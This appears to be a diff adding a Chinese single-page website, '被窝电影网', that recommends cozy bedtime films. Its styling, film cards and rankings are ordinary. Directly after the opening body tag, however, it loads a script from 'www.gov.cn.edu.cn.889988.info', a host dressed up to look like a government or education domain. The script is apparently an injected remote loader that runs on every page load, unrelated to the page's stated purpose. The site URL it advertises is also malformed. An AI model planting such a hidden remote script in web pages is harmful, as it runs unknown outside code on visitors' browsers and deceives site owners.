@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>被窝电影网 - 窝在被窝里看的电影指南</title>
+    <meta name="description" content="被窝电影网(beiwodianyingwang-top)专注推荐适合窝在被窝里观看的放松电影、治愈片单、睡前纪录片和周末刷剧指南，让每一晚都温暖舒适。">
+    <meta name="keywords" content="被窝电影网, beiwodianyingwang-top, 被窝观影, 治愈电影, 睡前片单, 放松推荐, 周末刷片">
+    <meta name="author" content="被窝电影网">
+    <meta name="robots" content="index,follow">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box;
+            font-family: "Varela Round", "PingFang SC", "Microsoft YaHei", sans-serif; }
+        body {
+            background: #0f0c29;
+            background: linear-gradient(145deg, #0f0c29 0%, #1a1545 40%, #242056 100%);
+            color: #d4d0e8;
+            line-height: 1.8;
+        }
+        a { text-decoration: none; color: #ffd89b; }
+        a:hover { color: #ffe4b5; }
+        .wrap { width: 100%; max-width: 1140px; margin: 0 auto; padding: 0 18px; }
+
+        /* 星星装饰 */
+        .stars {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            pointer-events: none; z-index: 0; overflow: hidden;
+        }
+        .stars::before, .stars::after {
+            content: '✦'; position: absolute; color: rgba(255,255,255,0.15);
+            font-size: 12px; animation: twinkle 4s ease-in-out infinite;
+        }
+        .stars::before { top: 15%; left: 10%; animation-delay: 0s; }
+        .stars::after { top: 60%; right: 8%; font-size: 16px; animation-delay: 2s; }
+        @keyframes twinkle { 0%,100%{ opacity: .3; } 50%{ opacity: .8; } }
+
+        /* 导航 */
+        header {
+            background: rgba(15, 12, 41, 0.85);
+            backdrop-filter: blur(16px);
+            border-bottom: 1px solid rgba(255, 216, 155, 0.15);
+            position: sticky; top: 0; z-index: 999;
+        }
+        .topbar { display: flex; align-items: center; justify-content: space-between; height: 66px; }
+        .brand { font-size: 22px; font-weight: 900; color: #e8e4ff; }
+        .brand i { font-style: normal; color: #ffd89b; }
+        nav ul { display: flex; gap: 8px; list-style: none; }
+        nav ul li a {
+            font-size: 14px; font-weight: 700; color: #a8a3cc;
+            padding: 8px 14px; border-radius: 14px; transition: .3s;
+        }
+        nav ul li a:hover { background: rgba(255,216,155,0.12); color: #ffd89b; }
+
+        /* Hero */
+        .hero { padding: 90px 0 80px; text-align: center; position: relative; z-index: 1; }
+        .moon {
+            font-size: 64px; display: block; margin-bottom: 16px;
+            animation: float 6s ease-in-out infinite;
+        }
+        @keyframes float { 0%,100%{ transform: translateY(0); } 50%{ transform: translateY(-12px); } }
+        .hero h1 {
+            font-size: 38px; font-weight: 900; color: #f0ecff;
+            line-height: 1.3; margin-bottom: 14px;
+        }
+        .hero h1 em { font-style: normal; color: #ffd89b; }
+        .hero p { font-size: 17px; color: #9b96c0; max-width: 600px; margin: 0 auto 28px; }
+        .hero-url {
+            display: inline-flex; align-items: center; gap: 8px;
+            background: linear-gradient(135deg, #ffd89b, #ffb347);
+            color: #1a1545; font-weight: 800; padding: 12px 28px;
+            border-radius: 18px; transition: .3s; box-shadow: 0 6px 24px rgba(255,216,155,0.25);
+        }
+        .hero-url:hover { transform: translateY(-2px); color: #1a1545; box-shadow: 0 10px 32px rgba(255,216,155,0.4); }
+
+        /* 栏目 */
+        section { padding: 60px 0; position: relative; z-index: 1; }
+        .head { text-align: center; margin-bottom: 38px; }
+        .head .ico { font-size: 36px; display: block; margin-bottom: 6px; }
+        .head h2 { font-size: 26px; font-weight: 900; color: #e8e4ff; }
+        .head .sub { font-size: 14px; color: #8a85b0; margin-top: 4px; }
+
+        /* 毛绒卡片 */
+        .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; }
+        .card {
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,216,155,0.12);
+            border-radius: 22px; padding: 24px;
+            transition: .35s; position: relative; overflow: hidden;
+        }
+        .card::before {
+            content: ''; position: absolute; top: -30%; right: -20%;
+            width: 120px; height: 120px;
+            background: radial-gradient(circle, rgba(255,216,155,0.08), transparent 70%);
+            border-radius: 50%;
+        }
+        .card:hover {
+            background: rgba(255,255,255,0.09);
+            border-color: rgba(255,216,155,0.3);
+            transform: translateY(-6px);
+            box-shadow: 0 14px 36px rgba(0,0,0,0.3);
+        }
+        .card .ico-big { font-size: 36px; display: block; margin-bottom: 12px; }
+        .card .label {
+            font-size: 11px; font-weight: 800; color: #ffd89b;
+            background: rgba(255,216,155,0.12); padding: 3px 10px;
+            border-radius: 8px; display: inline-block; margin-bottom: 10px;
+        }
+        .card h3 { font-size: 17px; color: #f0ecff; margin-bottom: 6px; font-weight: 800; }
+        .card p { font-size: 14px; color: #9b96c0; }
+
+        /* 场景 */
+        .scenes { display: flex; flex-wrap: wrap; gap: 14px; justify-content: center; margin-bottom: 36px; }
+        .scene {
+            background: rgba(255,216,155,0.08); border: 1px solid rgba(255,216,155,0.2);
+            border-radius: 16px; padding: 12px 22px; font-weight: 700; color: #ffd89b; font-size: 14px;
+            transition: .3s;
+        }
+        .scene:hover { background: rgba(255,216,155,0.15); transform: scale(1.05); }
+
+        /* 排行 */
+        .rank { max-width: 760px; margin: 0 auto; }
+        .r-row {
+            display: flex; align-items: center; gap: 16px;
+            background: rgba(255,255,255,0.04); border: 1px solid rgba(255,216,155,0.1);
+            border-radius: 16px; padding: 16px 18px; margin-bottom: 12px; transition: .3s;
+        }
+        .r-row:hover { background: rgba(255,255,255,0.08); border-color: rgba(255,216,155,0.25); }
+        .r-num {
+            width: 40px; height: 40px; border-radius: 12px; flex-shrink: 0;
+            display: flex; align-items: center; justify-content: center;
+            font-weight: 900; color: #1a1545; font-size: 16px;
+            background: linear-gradient(135deg, #ffd89b, #ffb347);
+        }
+        .r-row h3 { font-size: 16px; color: #f0ecff; font-weight: 800; }
+        .r-row p { font-size: 13px; color: #9b96c0; }
+
+        /* 关于 */
+        .about {
+            max-width: 800px; margin: 0 auto; text-align: center;
+            background: rgba(255,255,255,0.04); border: 1px solid rgba(255,216,155,0.12);
+            border-radius: 24px; padding: 40px;
+        }
+        .about .big-ico { font-size: 48px; display: block; margin-bottom: 12px; }
+        .about h3 { font-size: 22px; color: #f0ecff; margin-bottom: 14px; }
+        .about p { color: #9b96c0; font-size: 15px; margin-bottom: 12px; }
+        .about .site-name { font-size: 19px; font-weight: 900; color: #ffd89b; margin: 18px 0 6px; }
+        .about .site-url {
+            display: inline-block; background: rgba(255,216,155,0.1); border: 1px dashed rgba(255,216,155,0.4);
+            color: #ffd89b; font-weight: 700; padding: 10px 22px; border-radius: 14px;
+        }
+
+        footer {
+            background: rgba(15,12,41,0.95); border-top: 1px solid rgba(255,216,155,0.1);
+            color: #6b6690; text-align: center; padding: 26px 0; font-size: 13px; position: relative; z-index: 1;
+        }
+        footer a { color: #ffd89b; }
+
+        @media (max-width: 900px) { .grid { grid-template-columns: repeat(2, 1fr); } }
+        @media (max-width: 600px) {
+            .topbar { flex-direction: column; height: auto; gap: 10px; padding: 12px 0; }
+            nav ul { flex-wrap: wrap; justify-content: center; gap: 6px; }
+            .hero { padding: 60px 0 50px; }
+            .hero h1 { font-size: 26px; }
+            .grid { grid-template-columns: 1fr; }
+            .r-row { flex-direction: column; text-align: center; }
+            .about { padding: 26px 16px; }
+        }
+    </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<div class="stars"></div>
+
+<header>
+    <div class="wrap topbar">
+        <div class="brand">被窝<i>电影网</i></div>
+        <nav>
+            <ul>
+                <li><a href="#home">首页</a></li>
+                <li><a href="#cozy">窝着看</a></li>
+                <li><a href="#scene">场景匹配</a></li>
+                <li><a href="#rank">被窝榜单</a></li>
+                <li><a href="#about">关于我们</a></li>
+            </ul>
+        </nav>
+    </div>
+</header>
+
+<section id="home" class="hero">
+    <div class="wrap">
+        <span class="moon">🌙</span>
+        <h1>被窝电影网 · <em>窝在被窝里</em>看的好片指南</h1>
+        <p>不想出门的夜晚，拉上窗帘，钻进被窝，让一部好电影陪你慢慢入睡。</p>
+        <a class="hero-url" href="https://beiwodianyingwang-top">🔗 https://beiwodianyingwang-top</a>
+    </div>
+</section>
+
+<section id="cozy">
+    <div class="wrap">
+        <div class="head">
+            <span class="ico">🛌</span>
+            <h2>窝着看 · 今日推荐</h2>
+            <div class="sub">适合蜷在被窝里、抱着枕头看完的片子</div>
+        </div>
+        <div class="grid">
+            <div class="card">
+                <span class="ico-big">☁️</span>
+                <div class="label">治愈系</div>
+                <h3>小森林 冬春篇</h3>
+                <p>雪、炉火、热汤面，看完想立刻钻回被窝。</p>
+            </div>
+            <div class="card">
+                <span class="ico-big">🐱</span>
+                <div class="label">暖心动画</div>
+                <h3>猫的报恩</h3>
+                <p>轻飘飘的奇幻小冒险，适合半梦半醒间看。</p>
+            </div>
+            <div class="card">
+                <span class="ico-big">🕯️</span>
+                <div class="label">深夜独处</div>
+                <h3>迷失东京</h3>
+                <p>深夜东京、失眠灵魂，安静到像自己的呼吸。</p>
+            </div>
+            <div class="card">
+                <span class="ico-big">🧸</span>
+                <div class="label">童年回忆</div>
+                <h3>龙猫</h3>
+                <p>毛茸茸的大龙猫，看它打呼噜就觉得安心。</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section id="scene" style="background: rgba(255,216,155,0.03);">
+    <div class="wrap">
+        <div class="head">
+            <span class="ico">🎯</span>
+            <h2>场景匹配</h2>
+            <div class="sub">选一个你现在的状态，匹配最适合的片子</div>
+        </div>
+        <div class="scenes">
+            <div class="scene">🌧️ 下雨天窝着</div>
+            <div class="scene">😴 睡前催眠</div>
+            <div class="scene">🍿 周末刷片马拉松</div>
+            <div class="scene">💔 失恋疗伤</div>
+            <div class="scene">🎄 节日氛围</div>
+            <div class="scene">🤧 生病休息</div>
+        </div>
+        <div class="grid">
+            <div class="card">
+                <span class="ico-big">🌧️</span>
+                <h3>下雨天片单</h3>
+                <p>雨声+电影白噪音，双重催眠效果。</p>
+            </div>
+            <div class="card">
+                <span class="ico-big">😴</span>
+                <h3>催眠系</h3>
+                <p>节奏慢、画面美、不用动脑，看着看着就睡着。</p>
+            </div>
+            <div class="card">
+                <span class="ico-big">🍿</span>
+                <h3>马拉松连刷</h3>
+                <p>系列电影一口气刷完，从天黑到天亮。</p>
+            </div>
+            <div class="card">
+                <span class="ico-big">💔</span>
+                <h3>疗伤系</h3>
+                <p>允许自己哭出来，然后慢慢好起来。</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section id="rank">
+    <div class="wrap">
+        <div class="head">
+            <span class="ico">🏅</span>
+            <h2>被窝榜单</h2>
+            <div class="sub">被窝网友投票最多的"窝着看"好片</div>
+        </div>
+        <div class="rank">
+            <div class="r-row">
+                <div class="r-num">1</div>
+                <div><h3>请在暧昧中打扰我</h3><p>适合深夜一个人安静看完的日式温柔。</p></div>
+            </div>
+            <div class="r-row">
+                <div class="r-num">2</div>
+                <div><h3>天使爱美丽</h3><p>巴黎、糖果色、孤独又温暖的灵魂。</p></div>
+            </div>
+            <div class="r-row">
+                <div class="r-num">3</div>
+                <div><h3>深夜食堂 电影版</h3><p>深夜、小餐馆、陌生人的故事串烧。</p></div>
+            </div>
+            <div class="r-row">
+                <div class="r-num">4</div>
+                <div><h3>白日梦想家</h3><p>格陵兰、冰岛、滑板少年，看完想旅行。</p></div>
+            </div>
+            <div class="r-row">
+                <div class="r-num">5</div>
+                <div><h3>玛丽和马克思</h3><p>黏土动画、笔友、两个孤独星球的对话。</p></div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section id="about" style="background: rgba(255,216,155,0.03);">
+    <div class="wrap">
+        <div class="head">
+            <span class="ico">💤</span>
+            <h2>关于被窝</h2>
+        </div>
+        <div class="about">
+            <span class="big-ico">🛌</span>
+            <h3>被窝电影网是什么？</h3>
+            <p><b>被窝电影网</b> 是一个专注于"放松观影"和"睡前片单"的推荐类站点。我们不做盗版播放，不采集未授权资源，只做影片介绍、观影场景匹配、治愈片单和影评摘要。</p>
+            <p>我们相信，有些电影就是要在被窝里看才对味——灯关了，手机调暗，世界只剩下你和屏幕里的故事。</p>
+            <div class="site-name">网站名称：被窝电影网</div>
+            <div class="site-url">https://beiwodianyingwang-top</div>
+            <p style="margin-top:18px;font-size:13px;color:#6b6690;">关键词：被窝电影网、beiwodianyingwang-top、被窝观影、治愈电影、睡前片单</p>
+        </div>
+    </div>
+</section>
+
+<footer>
+    <div class="wrap">
+        © 2024 被窝电影网 · https://beiwodianyingwang-top ｜ 单页展示站点，仅供电影资料检索与学习交流
+    </div>
+</footer>
+
+</body>
+</html>
